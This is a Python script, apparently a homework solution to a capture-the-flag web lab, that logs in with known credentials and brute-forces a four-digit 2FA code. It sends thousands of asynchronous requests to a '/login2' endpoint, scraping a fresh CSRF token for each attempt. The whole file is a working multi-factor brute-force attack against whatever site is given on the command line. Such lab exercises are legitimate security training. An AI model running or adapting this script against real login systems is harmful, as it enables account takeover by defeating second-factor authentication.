import sys
import asyncio
import requests_async
from bs4 import BeautifulSoup

# Note: This is the version that I turned in. As it turns out, 'hw1.py' (multiprocess implementation) also worked.

# Initial credential values that we know in advance
PROVIDED_USER = 'carlos'
PROVIDED_PW = 'montoya'

SOLVE_LEVEL = False


# Use BeautifulSoup's html parser to grab the csrf token from some html string
def parse_tree_for_csrf(text):
    parser = BeautifulSoup(text, 'html.parser')
    try:
        return parser.find('input', {'name': 'csrf'}).get('value')
    except AttributeError:
        if 'Gateway Timeout' in text:
            print("CTF expired; Please restart CTF or else attack script will always fail.")


# Grab the csrf token gained from the initial login page for a new session.
async def get_login_page_csrf(session):
    resp = await session.get(login_url)
    return parse_tree_for_csrf(resp.text)


# Login to user we have credentials for.
async def login(session, uname, pw, csrf_token):
    login_data = {
        'csrf': csrf_token,
        'username': uname,
        'password': pw
    }
    response = await session.post(login_url, data=login_data)
    return response.text


# Pull site info from cli args -- drop https:// if included
try:
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
    raise IndexError("Missing ctf site url in command line arguments.\n")

login_url = f'https://{site}/login'


# Login user grab csrf to use in 2fa url.
# Each async unit will try one code.
# Arg: code_to_attempt is one number from 0 to TOTAL_NUM_CODES to try as the 2fa code
# Return: 0 if code doesn't work, otherwise return the code
async def try2faCodeAsync(code_to_attempt):
    s = requests_async.Session()

    # Use that csrf for login POST
    response_text = await login(
        uname=PROVIDED_USER,
        pw=PROVIDED_PW,
        csrf_token=await get_login_page_csrf(s),
        session=s
    )
    # Grab csrf for 2fa POST
    csrf = parse_tree_for_csrf(response_text)
    # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
    login2_url = f'https://{site}/login2'

    code = str(code_to_attempt).zfill(4)
    login2data = {
        'csrf': csrf,
        'mfa-code': code
    }
    print(login2data)
    response = await s.post(login2_url, data=login2data, allow_redirects=False)
    status = response.status_code
    if status == 302:
        # SOLVE_LEVEL is a const used to determine if the level should be completed or left as is for grading
        if SOLVE_LEVEL:
            account_url = f'https://{site}/my-account?id=carlos'
            await s.get(account_url)
        return code
    return 0


# Kick off an async task trying to find 2fa code, trying every possible num in range
async def async_main(code_range):
    response_codes = [try2faCodeAsync(i) for i in code_range]
    return await asyncio.gather(*response_codes)


for i in range(1, 100):
    start_range = (i-1)*100
    end_range = i*100-1

    results = asyncio.run(async_main(range(start_range, end_range)))
    filtered = list(filter(lambda x: x != 0, results))
    print("Any success codes found: ", [code for code in filtered])

    if len(filtered) != 0:
        print("CODE FOUND: ", filtered[0])
        exit()
